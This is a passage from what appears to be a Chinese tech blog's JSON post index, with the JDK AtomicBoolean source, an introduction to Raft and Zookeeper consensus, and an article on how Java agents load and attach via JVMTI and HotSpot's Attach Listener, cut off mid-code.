源码参考123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package java.util.concurrent.atomic;import sun.misc.Unsafe;/** * A &#123;@code boolean&#125; value that may be updated atomically. See the * &#123;@link java.util.concurrent.atomic&#125; package specification for * description of the properties of atomic variables. An * &#123;@code AtomicBoolean&#125; is used in applications such as atomically * updated flags, and cannot be used as a replacement for a * &#123;@link java.lang.Boolean&#125;. * * @since 1.5 * @author Doug Lea */public class AtomicBoolean implements java.io.Serializable &#123; private static final long serialVersionUID = 4654671469794556979L; // setup to use Unsafe.compareAndSwapInt for updates private static final Unsafe unsafe = Unsafe.getUnsafe(); private static final long valueOffset; static &#123; try &#123; valueOffset = unsafe.objectFieldOffset (AtomicBoolean.class.getDeclaredField(&quot;value&quot;)); &#125; catch (Exception ex) &#123; throw new Error(ex); &#125; &#125; private volatile int value; /** * Creates a new &#123;@code AtomicBoolean&#125; with the given initial value. * * @param initialValue the initial value */ public AtomicBoolean(boolean initialValue) &#123; value = initialValue ? 1 : 0; &#125; /** * Creates a new &#123;@code AtomicBoolean&#125; with initial value &#123;@code false&#125;. */ public AtomicBoolean() &#123; &#125; /** * Returns the current value. * * @return the current value */ public final boolean get() &#123; return value != 0; &#125; /** * Atomically sets the value to the given updated value * if the current value &#123;@code ==&#125; the expected value. * * @param expect the expected value * @param update the new value * @return &#123;@code true&#125; if successful. False return indicates that * the actual value was not equal to the expected value. */ public final boolean compareAndSet(boolean expect, boolean update) &#123; int e = expect ? 1 : 0; int u = update ? 1 : 0; return unsafe.compareAndSwapInt(this, valueOffset, e, u); &#125; /** * Atomically sets the value to the given updated value * if the current value &#123;@code ==&#125; the expected value. * * &lt;p&gt;&lt;a href=&quot;package-summary.html#weakCompareAndSet&quot;&gt;May fail * spuriously and does not provide ordering guarantees&lt;/a&gt;, so is * only rarely an appropriate alternative to &#123;@code compareAndSet&#125;. * * @param expect the expected value * @param update the new value * @return &#123;@code true&#125; if successful */ public boolean weakCompareAndSet(boolean expect, boolean update) &#123; int e = expect ? 1 : 0; int u = update ? 1 : 0; return unsafe.compareAndSwapInt(this, valueOffset, e, u); &#125; /** * Unconditionally sets to the given value. * * @param newValue the new value */ public final void set(boolean newValue) &#123; value = newValue ? 1 : 0; &#125; /** * Eventually sets to the given value. * * @param newValue the new value * @since 1.6 */ public final void lazySet(boolean newValue) &#123; int v = newValue ? 1 : 0; unsafe.putOrderedInt(this, valueOffset, v); &#125; /** * Atomically sets to the given value and returns the previous value. * * @param newValue the new value * @return the previous value */ public final boolean getAndSet(boolean newValue) &#123; boolean prev; do &#123; prev = get(); &#125; while (!compareAndSet(prev, newValue)); return prev; &#125; /** * Returns the String representation of the current value. * @return the String representation of the current value */ public String toString() &#123; return Boolean.toString(get()); &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"atomic","slug":"atomic","permalink":"https://wuhaocn.github.io/tags/atomic/"}]},{"title":"分布式算法-raft","slug":"algorithm/分布式算法/分布式raft算法","date":"2021-10-01T13:12:11.458Z","updated":"2021-10-01T13:12:11.458Z","comments":true,"path":"2021/10/01/algorithm/分布式算法/分布式raft算法/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/%E5%88%86%E5%B8%83%E5%BC%8F%E7%AE%97%E6%B3%95/%E5%88%86%E5%B8%83%E5%BC%8Fraft%E7%AE%97%E6%B3%95/","excerpt":"","text":"raft算法介绍 Raft 算法一、更加直观的 Raft 算法Raft 适用于一个管理日志一致性的协议，相比于 Paxos 协议 Raft 更易于理解和去实现它。为了提高理解性，Raft 将一致性算法分为了几个部分，包括领导选取（leader selection）、日志复制（log replication）、安全（safety），并且使用了更强的一致性来减少了必须需要考虑的状态。 1.解决什么问题分布式存储系统通常通过维护多个副本来提高系统的 availability，带来的代价就是分布式存储系统的核心问题之一：维护多个副本的一致性。 Raft 协议基于复制状态机（replicated state machine），即一组 server 从相同的初始状态起，按相同的顺序执行相同的命令，最终会达到一直的状态，一组 server 记录相同的操作日志，并以相同的顺序应用到状态机。 Raft 有一个明确的场景，就是管理复制日志的一致性。 如图，每台机器保存一份日志，日志来自于客户端的请求，包含一系列的命令，状态机会按顺序执行这些命令。一致性算法管理来自客户端状态命令的复制日志，保证状态机处理的日志中的命令的顺序都是一致的，因此会得到相同的执行结果。 2.Raft 概览先看一段动画演示，Understandable Distributed Consensus 。 相比 Paxos，Raft 算法理解起来直观的很。 Raft 算法将 Server 划分为 3 种状态，或者也可以称作角色： Leader 负责 Client 交互和 log 复制，同一时刻系统中最多存在 1 个。 Follower 被动响应请求 RPC，从不主动发起请求 RPC。 Candidate 一种临时的角色，只存在于 leader 的选举阶段，某个节点想要变成 leader，那么就发起投票请求，同时自己变成 candidate。如果选举成功，则变为 candidate，否则退回为 follower 状态或者说角色的流转如下： 在 Raft 中，问题分解为：领导选取、日志复制、安全和成员变化。 复制状态机通过复制日志来实现： 日志：每台机器保存一份日志，日志来自于客户端的请求，包含一系列的命令 状态机：状态机会按顺序执行这些命令 一致性模型：分布式环境下，保证多机的日志是一致的，这样回放到状态机中的状态是一致的 二、Raft 算法流程Raft 中使用心跳机制来出发 leader 选举。当服务器启动的时候，服务器成为 follower。只要 follower 从 leader 或者 candidate 收到有效的 RPCs 就会保持 follower 状态。如果 follower 在一段时间内（该段时间被称为 election timeout）没有收到消息，则它会假设当前没有可用的 leader，然后开启选举新 leader 的流程。 1.TermTerm 的概念类比中国历史上的朝代更替，Raft 算法将时间划分成为任意不同长度的任期（term）。 任期用连续的数字进行表示。每一个任期的开始都是一次选举（election），一个或多个候选人会试图成为领导人。如果一个候选人赢得了选举，它就会在该任期的剩余时间担任领导人。在某些情况下，选票会被瓜分，有可能没有选出领导人，那么，将会开始另一个任期，并且立刻开始下一次选举。Raft 算法保证在给定的一个任期最多只有一个领导人。 2.RPCRaft 算法中服务器节点之间通信使用远程过程调用（RPCs），并且基本的一致性算法只需要两种类型的 RPCs，为了在服务器之间传输快照增加了第三种 RPC。 RPC 有三种： RequestVote RPC：候选人在选举期间发起 AppendEntries RPC：领导人发起的一种心跳机制，复制日志也在该命令中完成 InstallSnapshot RPC: 领导者使用该 RPC 来发送快照给太落后的追随者 3.选举流程（1）follower 增加当前的 term，转变为 candidate。（2）candidate 投票给自己，并发送 RequestVote RPC 给集群中的其他服务器。（3）收到 RequestVote 的服务器，在同一 term 中只会按照先到先得投票给至多一个 candidate。且只会投票给 log 至少和自身一样新的 candidate。 candidate 节点保持（2）的状态，直到下面三种情况中的一种发生。 该节点赢得选举。即收到大多数的节点的投票。则其转变为 leader 状态。 另一个服务器成为了 leader。即收到了 leader 的合法心跳包（term 值等于或大于当前自身 term 值）。则其转变为 follower 状态。 一段时间后依然没有胜者。该种情况下会开启新一轮的选举。 Raft 中使用随机选举超时时间来解决当票数相同无法确定 leader 的问题。 4.日志复制日志复制（Log Replication）主要作用是用于保证节点的一致性，这阶段所做的操作也是为了保证一致性与高可用性。 当 Leader 选举出来后便开始负责客户端的请求，所有事务（更新操作）请求都必须先经过 Leader 处理，日志复制（Log Replication）就是为了保证执行相同的操作序列所做的工作。 在 Raft 中当接收到客户端的日志（事务请求）后先把该日志追加到本地的 Log 中，然后通过 heartbeat 把该 Entry 同步给其他 Follower，Follower 接收到日志后记录日志然后向 Leader 发送 ACK，当 Leader 收到大多数（n/2+1）Follower 的 ACK 信息后将该日志设置为已提交并追加到本地磁盘中，通知客户端并在下个 heartbeat 中 Leader 将通知所有的 Follower 将该日志存储在自己的本地磁盘中。 三、Raft 和 Paxos 的工程应用Raft 算法的论文相比 Paxos 直观很多，更容易在工程上实现。 可以看到 Raft 算法的实现已经非常多了，https://raft.github.io//#implementations 1.Raft 的应用这里用 ETCD 来关注 Raft 的应用，ETCD 目标是构建一个高可用的分布式键值（key-value）数据库，基于 Go 语言实现。Etcd 主要用途是共享配置和服务发现，实现一致性使用了 Raft 算法。更多 Etcd 的应用可以查看文档：https://coreos.com/etcd/docs/latest/ 2.Zookeeper 中的 PaxosZookeeper 使用了一种修改后的 Paxos 协议。 在 Zookeeper 中，始终分为两种场景: Leader activation 在这个场景里，系统中缺乏 Leader(primary)，通过一个类似 paxos 协议的过程完成 Leader 选举。 Active messaging在 这个场景里，Leader 接收客户端发送的更新操作，以一种类似两阶段提交的过程在各个 follower (secondary)节点上进行更新操作。 在 Leader activation 场景中完成 leader 选举及数据同步后，系统转入 Active messaging 场景，在 active messaging 中 leader 异常后，系统转入 Leader activation 场景。 无论在那种场景，Zookeeper 依赖于一个全局版本号:zxid。zxid 由(epoch, count)两部分组成， 高位的 epoch 部分是选举编号，每次提议进行新的 leader 选举时 epoch 都会增加，低位的 count 部分 是 leader 为每个更新操作决定的序号。可以认为，一个 leader 对应一个唯一的 epoch，每个 leader 任期内产生的更新操作对应一个唯一的有序的 count，从而从全局的视野，一个 zxid 代表了一个更新操作的全局序号(版本号)。 Zookeeper 通过 zxid 将两个场景阶段较好的结合起来，且能保证全局的强一致性。由于同一时刻只有一个 zookeeper 节点能获得超过半数的 follower，所以同一时刻最多只存在唯一的 leader;每个 leader 利用 FIFO 以 zxid 顺序更新各个 follower，只有成功完成前一个更新操作的才会进行下一个更新操作，在同一个 leader 任期内，数据在全局满足 quorum 约束的强一致，即读超过半数的节点 一定可以读到最新已提交的数据;每个成功的更新操作都至少被超过半数的节点确认，使得新选举 的 leader 一定可以包括最新的已成功提交的数据。 3.如何解决 split brain 问题分布式协议一个著名问题就是 split brain 问题。 简单说，就是比如当你的 cluster 里面有两个结点，它们都知道在这个 cluster 里需要选举出一个 master。那么当它们两之间的通信完全没有问题的时候，就会达成共识，选出其中一个作为 master。但是如果它们之间的通信出了问题，那么两个结点都会觉得现在没有 master，所以每个都把自己选举成 master。于是 cluster 里面就会有两个 master。 区块链的分叉其实类似分布式系统的 split brain。 一般来说，Zookeeper 会默认设置： zookeeper cluster 的节点数目必须是奇数。 zookeeper 集群中必须超过半数节点(Majority)可用，整个集群才能对外可用。 Majority 就是一种 Qunroms 的方式来支持 Leader 选举，可以防止 split brain 出现。奇数个节点可以在相同容错能力的情况下节省资源。 四、从 CAP 的角度理解几种不同的算法1.两阶段提交协议两阶段提交系统具有完全的 C，很糟糕的 A，很糟糕的 P。首先，两阶段提交协议保证了副本间是完全一致的，这也是协议的设计目的。再者，协议在一个节点出现异常时，就无法更新数据，其服务可用性较低。最后，一旦协调者与参与者之间网络分化，无法提供服务。 2.Paxos 和 Raft 算法Paxos 协议和 Raft 算法都是强一致性协议。Paxos 只有两种情况下服务不可用:一是超过半数的 Proposer 异常，二是出现活锁。前者可以通过增加 Proposer 的个数来 降低由于 Proposer 异常影响服务的概率，后者本身发生的概率就极低。最后，只要能与超过半数的 Proposer 通信就可以完成协议流程，协议本身具有较好的容忍网络分区的能力。 参考Raft 一致性算法Raft 一致性算法论文译文","categories":[],"tags":[]},{"title":"Java动态调试技术原理及实践","slug":"language/java/bytecode/Java动态调试技术原理及实践","date":"2021-10-01T13:12:11.458Z","updated":"2021-10-01T13:12:11.459Z","comments":true,"path":"2021/10/01/language/java/bytecode/Java动态调试技术原理及实践/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/language/java/bytecode/Java%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"Java动态调试技术原理及实践1. 动态调试要解决的问题断点调试是我们最常使用的调试手段，它可以获取到方法执行过程中的变量信息，并可以观察到方法的执行路径。但断点调试会在断点位置停顿，使得整个应用停止响应。在线上停顿应用是致命的，动态调试技术给了我们创造新的调试模式的想象空间。本文将研究 Java 语言中的动态调试技术，首先概括 Java 动态调试所涉及的技术基础，接着介绍我们在 Java 动态调试领域的思考及实践，通过结合实际业务场景，设计并实现了一种具备动态性的断点调试工具 Java-debug-tool，显著提高了故障排查效率。 2. Java Agent 技术JVMTI （JVM Tool Interface）是 Java 虚拟机对外提供的 Native 编程接口，通过 JVMTI，外部进程可以获取到运行时 JVM 的诸多信息，比如线程、GC 等。Agent 是一个运行在目标 JVM 的特定程序，它的职责是负责从目标 JVM 中获取数据，然后将数据传递给外部进程。加载 Agent 的时机可以是目标 JVM 启动之时，也可以是在目标 JVM 运行时进行加载，而在目标 JVM 运行时进行 Agent 加载具备动态性，对于时机未知的 Debug 场景来说非常实用。下面将详细分析 Java Agent 技术的实现细节。 2.1 Agent 的实现模式JVMTI 是一套 Native 接口，在 Java SE 5 之前，要实现一个 Agent 只能通过编写 Native 代码来实现。从 Java SE 5 开始，可以使用 Java 的 Instrumentation 接口（java.lang.instrument）来编写 Agent。无论是通过 Native 的方式还是通过 Java Instrumentation 接口的方式来编写 Agent，它们的工作都是借助 JVMTI 来进行完成，下面介绍通过 Java Instrumentation 接口编写 Agent 的方法。 2.1.1 通过 Java Instrumentation API实现 Agent 启动方法 Java Agent 支持目标 JVM 启动时加载，也支持在目标 JVM 运行时加载，这两种不同的加载模式会使用不同的入口函数，如果需要在目标 JVM 启动的同时加载 Agent，那么可以选择实现下面的方法： 12[1] public static void premain(String agentArgs, Instrumentation inst);[2] public static void premain(String agentArgs); JVM 将首先寻找[1]，如果没有发现[1]，再寻找[2]。如果希望在目标 JVM 运行时加载 Agent，则需要实现下面的方法： 12[1] public static void agentmain(String agentArgs, Instrumentation inst);[2] public static void agentmain(String agentArgs); 这两组方法的第一个参数 AgentArgs 是随同 “– javaagent”一起传入的程序参数，如果这个字符串代表了多个参数，就需要自己解析这些参数。inst 是 Instrumentation 类型的对象，是 JVM 自动传入的，我们可以拿这个参数进行类增强等操作。 指定 Main-ClassAgent 需要打包成一个 jar 包，在 ManiFest 属性中指定“Premain-Class”或者“Agent-Class”：Premain-Class: classAgent-Class: class挂载到目标 JVM将编写的 Agent 打成 jar 包后，就可以挂载到目标 JVM 上去了。如果选择在目标 JVM 启动时加载 Agent，则可以使用 “-javaagent:[=]”，具体的使用方法可以使用“Java -Help”来查看。如果想要在运行时挂载 Agent 到目标 JVM，就需要做一些额外的开发了。com.sun.tools.attach.VirtualMachine 这个类代表一个 JVM 抽象，可以通过这个类找到目标 JVM，并且将 Agent 挂载到目标 JVM 上。下面是使用 com.sun.tools.attach.VirtualMachine 进行动态挂载 Agent 的一般实现： 12345678910111213141516171819202122private void attachAgentToTargetJVM() throws Exception &#123; List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptors = VirtualMachine.list(); VirtualMachineDescriptor targetVM = null; for (VirtualMachineDescriptor descriptor : virtualMachineDescriptors) &#123; if (descriptor.id().equals(configure.getPid())) &#123; targetVM = descriptor; break; &#125; &#125; if (targetVM == null) &#123; throw new IllegalArgumentException(&quot;could not find the target jvm by process id:&quot; + configure.getPid()); &#125; VirtualMachine virtualMachine = null; try &#123; virtualMachine = VirtualMachine.attach(targetVM); virtualMachine.loadAgent(&quot;&#123;agent&#125;&quot;, &quot;&#123;params&#125;&quot;); &#125; catch (Exception e) &#123; if (virtualMachine != null) &#123; virtualMachine.detach(); &#125; &#125;&#125; 首先通过指定的进程 ID 找到目标 JVM，然后通过 Attach 挂载到目标 JVM 上，执行加载 Agent 操作。VirtualMachine 的 Attach 方法就是用来将 Agent 挂载到目标 JVM 上去的，而 Detach 则是将 Agent 从目标 JVM 卸载。关于 Agent 是如何挂载到目标 JVM 上的具体技术细节，将在下文中进行分析。 2.2 启动时加载 Agent2.2.1 参数解析创建 JVM 时，JVM 会进行参数解析，即解析那些用来配置 JVM 启动的参数，比如堆大小、GC 等；本文主要关注解析的参数为-agentlib、 -agentpath、 -javaagent，这几个参数用来指定 Agent，JVM 会根据这几个参数加载 Agent。下面来分析一下 JVM 是如何解析这几个参数的。 12345678910111213141516171819202122232425262728293031323334353637383940// -agentlib and -agentpathif (match_option(option, &quot;-agentlib:&quot;, &amp;tail) || (is_absolute_path = match_option(option, &quot;-agentpath:&quot;, &amp;tail))) &#123; if(tail != NULL) &#123; const char* pos = strchr(tail, &#x27;=&#x27;); size_t len = (pos == NULL) ? strlen(tail) : pos - tail; char* name = strncpy(NEW_C_HEAP_ARRAY(char, len + 1, mtArguments), tail, len); name[len] = &#x27;\\0&#x27;; char *options = NULL; if(pos != NULL) &#123; options = os::strdup_check_oom(pos + 1, mtArguments); &#125; #if !INCLUDE_JVMTI if (valid_jdwp_agent(name, is_absolute_path)) &#123; jio_fprintf(defaultStream::error_stream(), &quot;Debugging agents are not supported in this VM\\n&quot;); return JNI_ERR; &#125; #endif // !INCLUDE_JVMTI add_init_agent(name, options, is_absolute_path); &#125; // -javaagent &#125; else if (match_option(option, &quot;-javaagent:&quot;, &amp;tail)) &#123; #if !INCLUDE_JVMTI jio_fprintf(defaultStream::error_stream(), &quot;Instrumentation agents are not supported in this VM\\n&quot;); return JNI_ERR; #else if (tail != NULL) &#123; size_t length = strlen(tail) + 1; char *options = NEW_C_HEAP_ARRAY(char, length, mtArguments); jio_snprintf(options, length, &quot;%s&quot;, tail); add_init_agent(&quot;instrument&quot;, options, false); // java agents need module java.instrument if (!create_numbered_property(&quot;jdk.module.addmods&quot;, &quot;java.instrument&quot;, addmods_count++)) &#123; return JNI_ENOMEM; &#125; &#125; #endif // !INCLUDE_JVMTI &#125; 上面的代码片段截取自 hotspot/src/share/vm/runtime/arguments.cpp 中的 Arguments::parse_each_vm_init_arg(const JavaVMInitArgs* args, bool* patch_mod_javabase, Flag::Flags origin) 函数，该函数用来解析一个具体的 JVM 参数。这段代码的主要功能是解析出需要加载的 Agent 路径，然后调用 add_init_agent 函数进行解析结果的存储。下面先看一下 add_init_agent 函数的具体实现： 1234// -agentlib and -agentpath argumentsstatic AgentLibraryList _agentList;static void add_init_agent(const char* name, char* options, bool absolute_path) &#123; _agentList.add(new AgentLibrary(name, options, absolute_path, NULL)); &#125; AgentLibraryList 是一个简单的链表结构，add_init_agent 函数将解析好的、需要加载的 Agent 添加到这个链表中，等待后续的处理。 这里需要注意，解析-javaagent 参数有一些特别之处，这个参数用来指定一个我们通过 Java Instrumentation API 来编写的 Agent，Java Instrumentation API 底层依赖的是 JVMTI，对-JavaAgent 的处理也说明了这一点，在调用 add_init_agent 函数时第一个参数是“instrument”，关于加载 Agent 这个问题在下一小节进行展开。到此，我们知道在启动 JVM 时指定的 Agent 已经被 JVM 解析完存放在了一个链表结构中。下面来分析一下 JVM 是如何加载这些 Agent 的。 2.2.2 执行加载操作在创建 JVM 进程的函数中，解析完 JVM 参数之后，下面的这段代码和加载 Agent 相关： 1234567 // Launch -agentlib/-agentpath and converted -Xrun agentsif (Arguments::init_agents_at_startup()) &#123; create_vm_init_agents();&#125;static bool init_agents_at_startup() &#123; return !_agentList.is_empty();&#125; 当 JVM 判断出上一小节中解析出来的 Agent 不为空的时候，就要去调用函数 create_vm_init_agents 来加载 Agent，下面来分析一下 create_vm_init_agents 函数是如何加载 Agent 的。 12345678910void Threads::create_vm_init_agents() &#123; AgentLibrary* agent; for (agent = Arguments::agents(); agent != NULL; agent = agent-&gt;next()) &#123; OnLoadEntry_t on_load_entry = lookup_agent_on_load(agent); if (on_load_entry != NULL) &#123; // Invoke the Agent_OnLoad function jint err = (*on_load_entry)(&amp;main_vm, agent-&gt;options(), NULL); &#125; &#125;&#125; create_vm_init_agents 这个函数通过遍历 Agent 链表来逐个加载 Agent。通过这段代码可以看出，首先通过 lookup_agent_on_load 来加载 Agent 并且找到 Agent_OnLoad 函数，这个函数是 Agent 的入口函数。如果没找到这个函数，则认为是加载了一个不合法的 Agent，则什么也不做，否则调用这个函数，这样 Agent 的代码就开始执行起来了。对于使用 Java Instrumentation API 来编写 Agent 的方式来说，在解析阶段观察到在 add_init_agent 函数里面传递进去的是一个叫做”instrument”的字符串，其实这是一个动态链接库。在 Linux 里面，这个库叫做 libinstrument.so，在 BSD 系统中叫做 libinstrument.dylib，该动态链接库在{JAVA_HOME}/jre/lib/目录下。 2.2.3 Instrument 动态链接库libinstrument 用来支持使用 Java Instrumentation API 来编写 Agent，在 libinstrument 中有一个非常重要的类称为：JPLISAgent（Java Programming Language Instrumentation Services Agent），它的作用是初始化所有通过 Java Instrumentation API 编写的 Agent，并且也承担着通过 JVMTI 实现 Java Instrumentation 中暴露 API 的责任。我们已经知道，在 JVM 启动的时候，JVM 会通过-javaagent 参数加载 Agent。最开始加载的是 libinstrument 动态链接库，然后在动态链接库里面找到 JVMTI 的入口方法：Agent_OnLoad。下面就来分析一下在 libinstrument 动态链接库中，Agent_OnLoad 函数是怎么实现的。 1234567891011121314151617181920212223JNIEXPORT jint JNICALLDEF_Agent_OnLoad(JavaVM *vm, char *tail, void * reserved) &#123; initerror = createNewJPLISAgent(vm, &amp;agent); if ( initerror == JPLIS_INIT_ERROR_NONE ) &#123; if (parseArgumentTail(tail, &amp;jarfile, &amp;options) != 0) &#123; fprintf(stderr, &quot;-javaagent: memory allocation failure.\\n&quot;); return JNI_ERR; &#125; attributes = readAttributes(jarfile); premainClass = getAttribute(attributes, &quot;Premain-Class&quot;); /* Save the jarfile name */ agent-&gt;mJarfile = jarfile; /* * Convert JAR attributes into agent capabilities */ convertCapabilityAttributes(attributes, agent); /* * Track (record) the agent class name and options data */ initerror = recordCommandLineData(agent, premainClass, options); &#125; return result;&#125; 上述代码片段是经过精简的 libinstrument 中 Agent_OnLoad 实现的，大概的流程就是：先创建一个 JPLISAgent，然后将 ManiFest 中设定的一些参数解析出来， 比如（Premain-Class）等。创建了 JPLISAgent 之后，调用 initializeJPLISAgent 对这个 Agent 进行初始化操作。跟进 initializeJPLISAgent 看一下是如何初始化的： 1234567891011121314151617JPLISInitializationError initializeJPLISAgent(JPLISAgent *agent, JavaVM *vm, jvmtiEnv *jvmtienv) &#123; /* check what capabilities are available */ checkCapabilities(agent); /* check phase - if live phase then we don&#x27;t need the VMInit event */ jvmtierror = (*jvmtienv)-&gt;GetPhase(jvmtienv, &amp;phase); /* now turn on the VMInit event */ if ( jvmtierror == JVMTI_ERROR_NONE ) &#123; jvmtiEventCallbacks callbacks; memset(&amp;callbacks, 0, sizeof(callbacks)); callbacks.VMInit = &amp;eventHandlerVMInit; jvmtierror = (*jvmtienv)-&gt;SetEventCallbacks(jvmtienv,&amp;callbacks,sizeof(callbacks)); &#125; if ( jvmtierror == JVMTI_ERROR_NONE ) &#123; jvmtierror = (*jvmtienv)-&gt;SetEventNotificationMode(jvmtienv,JVMTI_ENABLE,JVMTI_EVENT_VM_INIT,NULL); &#125; return (jvmtierror == JVMTI_ERROR_NONE)? JPLIS_INIT_ERROR_NONE : JPLIS_INIT_ERROR_FAILURE;&#125; 这里，我们关注 callbacks.VMInit = &eventHandlerVMInit;这行代码，这里设置了一个 VMInit 事件的回调函数，表示在 JVM 初始化的时候会回调 eventHandlerVMInit 函数。下面来看一下这个函数的实现细节，猜测就是在这里调用了 Premain 方法： 1234567891011121314151617181920void JNICALL eventHandlerVMInit( jvmtiEnv *jvmtienv,JNIEnv *jnienv,jthread thread) &#123; // ... success = processJavaStart( environment-&gt;mAgent, jnienv); // ...&#125;jboolean processJavaStart(JPLISAgent *agent,JNIEnv *jnienv) &#123; result = createInstrumentationImpl(jnienv, agent); /* * Load the Java agent, and call the premain. */ if ( result ) &#123; result = startJavaAgent(agent, jnienv, agent-&gt;mAgentClassName, agent-&gt;mOptionsString, agent-&gt;mPremainCaller); &#125; return result;&#125;jboolean startJavaAgent( JPLISAgent *agent,JNIEnv *jnienv,const char *classname,const char *optionsString,jmethodID agentMainMethod) &#123; // ... invokeJavaAgentMainMethod(jnienv,agent-&gt;mInstrumentationImpl,agentMainMethod, classNameObject,optionsStringObject); // ...&#125; 看到这里，Instrument 已经实例化，invokeJavaAgentMainMethod 这个方法将我们的 Premain 方法执行起来了。接着，我们就可以根据 Instrument 实例来做我们想要做的事情了。 2.3 运行时加载 Agent比起 JVM 启动时加载 Agent，运行时加载 Agent 就比较有诱惑力了，因为运行时加载 Agent 的能力给我们提供了很强的动态性，我们可以在需要的时候加载 Agent 来进行一些工作。因为是动态的，我们可以按照需求来加载所需要的 Agent，下面来分析一下动态加载 Agent 的相关技术细节。 2.3.1 AttachListenerAttach 机制通过 Attach Listener 线程来进行相关事务的处理，下面来看一下 Attach Listener 线程是如何初始化的。 12345678910// Starts the Attach Listener threadvoid AttachListener::init() &#123; // 创建线程相关部分代码被去掉了 const char thread_name[] = &quot;Attach Listener&quot;; Handle string = java_lang_String::create_from_str(thread_name, THREAD); &#123; MutexLocker mu(Threads_lock); JavaThread* listener_thread = new JavaThread(&amp;attach_listener_thread_entry); // ... &#125;&#125; 我们知道，一个线程启动之后都需要指定一个入口来执行代码，Attach Listener 线程的入口是 attach_listener_thread_entry，下面看一下这个函数的具体实现： 12345678910111213141516static void attach_listener_thread_entry(JavaThread* thread, TRAPS) &#123; AttachListener::set_initialized(); for (;;) &#123; AttachOperation* op = AttachListener::dequeue(); // find the function to dispatch too AttachOperationFunctionInfo* info = NULL; for (int i=0; funcs[i].name != NULL; i++) &#123; const char* name = funcs[i].name; if (strcmp(op-&gt;name(), name) == 0) &#123; info = &amp;(funcs[i]); break; &#125;&#125; // dispatch to the function that implements this operation res = (info-&gt;func)(op, &amp;st); //... &#125;&#125; 整个函数执行逻辑，大概是这样的： 拉取一个需要执行的任务：AttachListener::dequeue。 查询匹配的命令处理函数。 执行匹配到的命令执行函数。 其中第二步里面存在一个命令函数表，整个表如下： 12345678910111213static AttachOperationFunctionInfo funcs[] = &#123; &#123; &quot;agentProperties&quot;, get_agent_properties &#125;, &#123; &quot;datadump&quot;, data_dump &#125;, &#123; &quot;dumpheap&quot;, dump_heap &#125;, &#123; &quot;load&quot;, load_agent &#125;, &#123; &quot;properties&quot;, get_system_properties &#125;, &#123; &quot;threaddump&quot;, thread_dump &#125;, &#123; &quot;inspectheap&quot;, heap_inspection &#125;, &#123; &quot;setflag&quot;, set_flag &#125;, &#123; &quot;printflag&quot;, print_flag &#125;, &#123; &quot;jcmd&quot;, jcmd &#125;, &#123; NULL, NULL &#125;&#125;; 对于加载 Agent 来说，命令就是“load”。现在，我们知道了 Attach Listener 大概的工作模式，但是还是不太清楚任务从哪来，这个秘密就藏在 AttachListener::dequeue 这行代码里面，接下来我们来分析一下 dequeue 这个函数： 12345678910111213141516171819LinuxAttachOperation* LinuxAttachListener::dequeue() &#123; for (;;) &#123; // wait for client to connect struct sockaddr addr; socklen_t len = sizeof(addr); RESTARTABLE(::accept(listener(), &amp;addr, &amp;len), s); // get the credentials of the peer and check the effective uid/guid // - check with jeff on this. struct ucred cred_info; socklen_t optlen = sizeof(cred_info); if (::getsockopt(s, SOL_SOCKET, SO_PEERCRED, (void*)&amp;cred_info, &amp;optlen) == -1) &#123; ::close(s); continue; &#125; // peer credential look okay so we read the request LinuxAttachOperation* op = read_request(s); return op; &#125;&#125; 这是 Linux 上的实现，不同的操作系统实现方式不太一样。上面的代码表面，Attach Listener 在某个端口监听着，通过 accept 来接收一个连接，然后从这个连接里面将请求读取出来，然后将请求包装成一个 AttachOperation 类型的对象，之后就会从表里查询对应的处理函数，然后进行处理。 1234567891011121314151617Attach Listener使用一种被称为“懒加载”的策略进行初始化，也就是说，JVM启动的时候Attach Listener并不一定会启动起来。下面我们来分析一下这种“懒加载”策略的具体实现方案。 // Start Attach Listener if +StartAttachListener or it can&#x27;t be started lazily if (!DisableAttachMechanism) &#123; AttachListener::vm_start(); if (StartAttachListener || AttachListener::init_at_startup()) &#123; AttachListener::init(); &#125; &#125;// Attach Listener is started lazily except in the case when// +ReduseSignalUsage is usedbool AttachListener::init_at_startup() &#123; if (ReduceSignalUsage) &#123; return true; &#125; else &#123; return false; &#125;&#125; 上面的代码截取自 create_vm 函数，DisableAttachMechanism、StartAttachListener 和 ReduceSignalUsage 这三个变量默认都是 false，所以 AttachListener::init();这行代码不会在 create_vm 的时候执行，而 vm_start 会执行。下面来看一下这个函数的实现细节： 123456789101112131415void AttachListener::vm_start() &#123; char fn[UNIX_PATH_MAX]; struct stat64 st; int ret; int n = snprintf(fn, UNIX_PATH_MAX, &quot;%s/.java_pid%d&quot;, os::get_temp_directory(), os::current_process_id()); assert(n &lt; (int)UNIX_PATH_MAX, &quot;java_pid file name buffer overflow&quot;); RESTARTABLE(::stat64(fn, &amp;st), ret); if (ret == 0) &#123; ret = ::unlink(fn); if (ret == -1) &#123; log_debug(attach)(&quot;Failed to remove stale attach pid file at %s&quot;, fn); &#125; &#125;&#125; 这是在 Linux 上的实现，是将/tmp/目录下的.java_pid{pid}文件删除，后面在创建 Attach Listener 线程的时候会创建出来这个文件。上面说到，AttachListener::init()这行代码不会在 create_vm 的时候执行，这行代码的实现已经在上文中分析了，就是创建 Attach Listener 线程，并监听其他 JVM 的命令请求。现在来分析一下这行代码是什么时候被调用的，也就是“懒加载”到底是怎么加载起来的。 // Signal Dispatcher needs to be started before VMInit event is postedos::signal_init();这是 create_vm 中的一段代码，看起来跟信号相关，其实 Attach 机制就是使用信号来实现“懒加载“的。下面我们来仔细地分析一下这个过程。 12345678910111213141516171819202122232425void os::signal_init() &#123; if (!ReduceSignalUsage) &#123; // Setup JavaThread for processing signals EXCEPTION_MARK; Klass* k = SystemDictionary::resolve_or_fail(vmSymbols::java_lang_Thread(), true, CHECK); instanceKlassHandle klass (THREAD, k); instanceHandle thread_oop = klass-&gt;allocate_instance_handle(CHECK); const char thread_name[] = &quot;Signal Dispatcher&quot;; Handle string = java_lang_String::create_from_str(thread_name, CHECK); // Initialize thread_oop to put it into the system threadGroup Handle thread_group (THREAD, Universe::system_thread_group()); JavaValue 